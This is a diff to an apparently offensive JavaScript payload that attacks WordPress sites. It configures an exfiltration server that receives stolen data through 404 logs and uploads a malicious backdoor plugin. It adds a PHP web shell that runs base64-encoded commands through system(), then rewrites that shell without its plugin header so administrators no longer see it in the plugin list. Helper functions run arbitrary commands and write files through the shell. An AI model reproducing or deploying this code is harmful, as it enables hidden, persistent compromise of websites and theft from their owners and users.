@@ -22,7 +22,11 @@
 // This will be as base64 data with a .js added, trying to 
 // include a non-exist remote javascript file so you 
 // get the base64 data in the 404 log
-var httpExfilServer = "http://192.168.78.135:8888"
+var httpExfilServer = "http://192.168.78.135:8888";
+
+
+// This will hold the webshell location
+var webShellPath = "shell/shell.php";
 
 
 
@@ -33,7 +37,8 @@ const sleep = (milliseconds) =>
 
 
 
-function read_body(xhr) { 
+function read_body(xhr) 
+{ 
 	var data;
 
 	if (!xhr.responseType || xhr.responseType === "text") 
@@ -292,6 +297,7 @@ function installYertleShell()
 			uploadXhr.send(new Blob([aBody]));
 
 			console.log("Done uploading malicious plugin");
+
 			// This is fun, you don't actually have to activate the yertle plugin
 			// to use it. 
 			// You can now use the yertle script to interact with the server by 
@@ -304,29 +310,78 @@ function installYertleShell()
 			// Scott White noticed it, and informed me of my error. 
 			// Not through a pull request, no. Shit-posting, yes. 
 			// God bless that fella. 
-
 		}
 	}
 }
 
 
 
-// Would be nice to make another version for hiding 
-// arbitrary plugins, assuming you add the plugin code. 
+
+
+
+
 async function hideYertleShell()
 {
-	// So this cmd in base64 is a php call to overwrite the
-	// shell.php file with the same code, just without the comments
-	// that hold the wordpress plugin details that wordpress
-	// scrapes to fill in the plugin menu entry. This effectively
-	// hides the plugin in the administrator UI, although the 
-	// files are still plainly viewable on the filesystem if
-	// anyone goes looking. 
-	var uri = "/wp-content/plugins/shell/shell.php?cmd=cGhwIC1yICdlY2hvIGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFLSUNBZ0lDUmpiMjF0WVc1a0lEMGdK%0ARjlIUlZSYkltTnRaQ0pkT3dvZ0lDQWdKR052YlcxaGJtUWdQU0J6ZFdKemRISW8KSkdOdmJXMWhi%0AbVFzSURBc0lDMHhLVHNLSUNBZ0lDUmpiMjF0WVc1a0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNna1ky%0AOXRiV0Z1WkNrNwpDZ29nSUNBZ2FXWWdLR05zWVhOelgyVjRhWE4wY3lnblVtVm1iR1ZqZEdsdmJr%0AWjFibU4wYVc5dUp5a3BJSHNLSUNBZ0lDQWdJQ1JtCmRXNWpkR2x2YmlBOUlHNWxkeUJTWldac1pX%0ATjBhVzl1Um5WdVkzUnBiMjRvSjNONWMzUmxiU2NwT3dvZ0lDQWdJQ0FnSkhSb2FXNW4KZVNBOUlD%0AUm1kVzVqZEdsdmJpMCthVzUyYjJ0bEtDUmpiMjF0WVc1a0lDazdDZ29nSUNBZ2ZTQmxiSE5sYVdZ%0AZ0tHWjFibU4wYVc5dQpYMlY0YVhOMGN5Z25ZMkZzYkY5MWMyVnlYMloxYm1OZllYSnlZWGtuS1Nr%0AZ2V3b2dJQ0FnSUNBZ1kyRnNiRjkxYzJWeVgyWjFibU5mCllYSnlZWGtvSjNONWMzUmxiU2NzSUdG%0AeWNtRjVLQ1JqYjIxdFlXNWtLU2s3Q2dvZ0lDQWdmU0JsYkhObGFXWWdLR1oxYm1OMGFXOXUKWDJW%0ANGFYTjBjeWduWTJGc2JGOTFjMlZ5WDJaMWJtTW5LU2tnZXdvZ0lDQWdJQ0FnWTJGc2JGOTFjMlZ5%0AWDJaMWJtTW9KM041YzNSbApiU2NzSUNSamIyMXRZVzVrS1RzS0NpQWdJQ0I5SUdWc2MyVWdld29n%0ASUNBZ0lDQWdjM2x6ZEdWdEtDUmpiMjF0WVc1a0tUc0tJQ0FnCklIMEtDaUFnSUNBL1Bnb2dJQ0Fn%0ACiIpOycgPiBzaGVsbC5waHA%3D%0A";
-	
-	var testUri = "/wp-content/plugins/shell/shell.php";
+	// We need the plugin contents without the 
+	// comments to make it 
+	// not show up in the plugin list
+	//
+	// So whatever plugin you installed, copy 
+	// the source code of it here without
+	// the comments at the top of the file.
+	//
+	// For example, below is the yertle shell
+	// with out the following comments that 
+	// are used to populate the plugin UI list:
 
-	// First we need to make sure the wordpress
+	/*
+    Plugin Name: Yertle Interactive Shell
+    Plugin URI: https://github.com/n00py
+    Description: This is a backdoor PHP shell designed to be used with the Yertle script from WPForce.
+    Version: 0.1
+    Author URI: https://github.com/n00py
+    */
+
+	//
+	// Make sure there isn't an extra carriage return
+	// at the end of the file here
+	// You should probably test this on your own server thoroughly to 
+	// make sure it works as expected
+
+	var testUri = "/wp-content/plugins/" + webShellPath;
+
+
+	var payload =`<?php
+    $command = $_GET["cmd"];
+    $command = substr($command, 0, -1);
+    $command = base64_decode($command);
+
+    if (class_exists('ReflectionFunction')) {
+       $function = new ReflectionFunction('system');
+       $thingy = $function->invoke($command );
+
+    } elseif (function_exists('call_user_func_array')) {
+       call_user_func_array('system', array($command));
+
+    } elseif (function_exists('call_user_func')) {
+       call_user_func('system', $command);
+
+    } else {
+       system($command);
+    }
+
+    ?>`;
+
+	var encodedPayload = btoa(payload);
+	// console.log("Encoded file payload is: " + encodedPayload);
+
+	var cmd = "php -r \'echo base64_decode(\"" + encodedPayload + "\");\' > shell.php\n";
+	var encodedCmd = btoa(cmd);
+
+	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCmd;
+	var testUri = "/wp-content/plugins/" + webShellPath;
+
+	// Before we sent this, we first  need to make sure the wordpress
 	// server has finished installing the yertle plugin
 	// since this function needs the shell in order
 	// to overwrite itself
@@ -338,16 +393,17 @@ async function hideYertleShell()
 
 		if (xhr.status == 200) 
 		{
-  			console.log("!! Our shell is ready!");
+  			//console.log("!! Our shell is ready!");
   			break;
 		}
 		if (xhr.status == 404)
 		{
-			console.log("Shell is still 404'ing...");
+			//console.log("Shell is still 404'ing...");
 			await sleep(5000);
 			continue;
 		}
 	}
+
 
 	console.log("About to overwrite the shell.php to hide it in the UI...");
 	xhr = new XMLHttpRequest();
@@ -450,7 +506,7 @@ function runCmd()
 
 	var payload = btoa(cmd);
 
-    var uri = "/wp-content/plugins/shell/shell.php?cmd=" + payload;
+    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;
 
     // Ok, let's send our command
 	xhr = new XMLHttpRequest();
@@ -464,11 +520,9 @@ function runCmd()
 // This is promising...
 function writeFile()
 {
-	var fileContent = `This
-	is Some
-	multiline
-	file content`;
-
+	var fixedPluginPath = "shell/shell.php";
+	//var fileContent = "#!/bin/bash tail --lines=+\`grep -n "\*/" shell.php | head -n 1 | awk -F: '{print $1+1}'\`  shell.php > shell.php";
+	var fileContent = "#!/bin/bash /usr/bin/tail --lines=\+\`/usr/bin/grep -n \"\*\/\" " + fixedPluginPath + " \| /usr/bin/head -n 1 \| /usr/bin/awk -F: \'\{print $1+1\}\'\` " + fixedPluginPath + " | tee  testScript.sh";
 	console.log("Starting write file..");
 
 	var encodedFileContent = btoa(fileContent);
@@ -476,7 +530,7 @@ function writeFile()
 
 	var payload = btoa(cmd);
 
-    var uri = "/wp-content/plugins/shell/shell.php?cmd=" + payload;
+    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;
 
     // Ok, let's send our command
 	xhr = new XMLHttpRequest();
@@ -488,17 +542,6 @@ function writeFile()
 	console.log("Done write file..");
 }
 
-
-
-function hidePlugin(pluginPath)
-{
-	// Ok, you can hide an arbitrary plugin by simply
-	// dropping the first comments in it, and 
-	// rewriting the file
-	// Here's a linux one liner:
-	// tail --lines=+`grep -n "*/" user-role-editor.php | head -n 1 | awk -F: '{print $1+1}'`  user-role-editor.php
-	// you can cat that back
-}
 
 
 
@@ -536,7 +579,11 @@ function hidePlugin(pluginPath)
 
 
 // Hide the yertle shell plugin from the UI
+// It will no longer show in the plugins
+// list for the admin use, but the 
+// shell will still function normally
 //hideYertleShell();
+
 
 
 // Someday this is going to work....
@@ -545,3 +592,4 @@ function hidePlugin(pluginPath)
 
 //runCmd();
 //writeFile();
+
